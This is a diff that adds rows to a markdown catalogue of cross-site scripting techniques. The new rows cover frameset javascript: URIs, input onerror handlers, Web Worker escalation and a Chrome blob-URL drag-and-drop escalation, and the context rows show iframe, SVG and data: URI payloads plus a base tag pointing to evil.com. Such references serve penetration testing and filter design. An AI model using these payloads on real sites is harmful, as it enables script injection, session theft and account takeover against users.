@@ -77,6 +77,8 @@ Injecting elements that load external content capable of script execution.
 | **iframe injection** | `<iframe src="javascript:alert(1)">` or `<iframe srcdoc="<script>alert(1)</script>">` | `srcdoc` bypasses some CSP; `javascript:` URI in src |
 | **object/embed injection** | `<object data="data:text/html,...">`, `<embed src="javascript:...">` | Legacy elements often overlooked by filters |
 | **SVG foreignObject** | `<svg><foreignObject><body onload=alert(1)>` | SVG rendering context allows embedded HTML via `foreignObject` |
+| **frame/frameset javascript: URI** | `<frameset><frame src="javascript:alert(origin)">` — deprecated `<frame>` element accepts `javascript:` URI in `src` attribute. Bypasses XSS filters that blocklist common elements (`<script>`, `<iframe>`, `<img>`, `<svg>`) but omit `<frame>` from their tag patterns. Requires injection point before `<body>` tag | Injection before `<body>`; XSS filter uses incomplete tag blocklist; browser supports deprecated `<frame>` |
+| **input type=image parameter injection** | `<input type="image" src="x" onerror="alert(1)">` — renders as a submit button that also appends `.x` and `.y` coordinate parameters on click. Can inject additional parameters via `formaction` attribute or exploit parameter pollution when extra `name.x`/`name.y` params are not expected | Form context; parameter-sensitive backend endpoint |
 | **base tag hijacking** | `<base href="https://evil.com/">` redirects all relative URLs | `base-uri` CSP directive absent; relative script paths exist on page |
 
 ---
@@ -194,6 +196,8 @@ Using executable protocol schemes where URLs are expected.
 | **data: URI base64** | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Base64 encoding evades pattern-matching filters |
 | **vbscript: (legacy IE)** | `vbscript:MsgBox("XSS")` | Internet Explorer; legacy protocol handler |
 | **blob: URI** | Constructing Blob URLs with HTML content containing scripts | Application creates and navigates to blob URLs |
+| **Web Worker context XSS** | XSS inside a Web Worker (via attacker-controlled `new Worker(url)` or unsanitized message handler) executes in `WorkerGlobalScope` without DOM access. Escalation paths: same-origin `fetch()` with credentials for API abuse, `postMessage()` to parent window (if parent has unsafe message handler → DOM XSS), IndexedDB manipulation to poison shared storage, and `caches` API access for Service Worker cache poisoning | Worker source URL or message handler processes attacker-controlled input; escalation requires unsafe `postMessage` handling in parent or shared storage dependency |
+| **Blob URL drag-and-drop escalation (Chrome)** | From Worker-confined XSS: create HTML Blob (`new Blob(['<script>...</script>'], {type:'text/html'})`), generate `blob:` URL via `URL.createObjectURL()`, leak URL externally via `fetch()`. Attacker page intercepts drag event, replaces `dataTransfer` data with leaked blob URL. When user releases mouse, blob URL opens in new tab inheriting victim origin — achieving full DOM XSS. Bypasses `ERR_UNSAFE_REDIRECT` by eliminating the initiator relationship between attacker and victim origins | Chrome browser; Worker XSS achieved; single user drag interaction required; attacker can host page that captures drag events |
 
 ### §4-2. URL Parser Differentials
 
